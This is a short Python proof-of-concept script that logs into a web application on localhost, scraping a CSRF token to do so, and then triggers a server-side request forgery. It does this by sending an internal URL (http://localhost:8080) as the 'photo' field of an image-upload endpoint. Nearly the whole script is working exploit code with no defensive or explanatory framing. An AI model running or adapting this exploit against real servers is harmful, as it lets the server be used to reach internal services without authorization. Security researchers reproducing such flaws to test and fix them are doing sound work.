import requests

SERVER_URL = 'http://localhost:22080'
EMAIL = 'test@test.com'
PASSWORD = '123456'


if __name__ == '__main__':
    session = requests.Session()
    login_page_url = f"{SERVER_URL}/auth/login"
    login_page_response = session.get(login_page_url)
    # <meta name="csrf-token" content="c3ba8553e0ef6b4f34136b58f664cce9e48c381d882dc0963be8b727a6c5bcba" />
    csrf_token = login_page_response.text.split('csrf-token" content="')[1].split('"')[0]
    print(csrf_token)

    login_data = {
        "login_email": EMAIL,
        "login_password": PASSWORD,
        "csrf_token": csrf_token,
        "remember": "1",
        "submit": "Log in"
    }
    login_response = session.post(login_page_url, data=login_data, allow_redirects=True)

    #Trigger SSRF
    upload_url = f'{SERVER_URL}/images/upload/photo?target_controller=content&target_subject=news&sizes=small,content_list_small,content_list,content_item'
    upload_data = {
        'photo': "http://localhost:8080"
    }
    upload_response = session.post(upload_url, data=upload_data, allow_redirects=True)
    print(upload_response.text)